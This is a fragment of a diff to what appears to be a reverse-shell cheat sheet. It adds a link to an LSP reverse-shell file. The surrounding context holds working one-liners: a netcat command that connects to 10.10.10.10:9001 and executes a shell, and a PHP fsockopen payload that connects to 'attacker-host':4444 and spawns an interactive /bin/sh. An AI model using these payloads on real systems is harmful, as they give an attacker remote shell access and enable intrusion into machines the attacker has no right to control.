@@ -25,6 +25,10 @@ nc 10.10.10.10 9001 -e powershell/sh
 php -r '\$sock=fsockopen(\"attacker-host\", 4444); exec(\"/bin/sh -i <&3 >&3 2>&3\");'
 ```
 
+##### LSP
+```
+https://github.com/the-emmons/lsp-reverse-shell/blob/main/rev.lsp
+```
 ### Windows
 #####  CMD
 ```
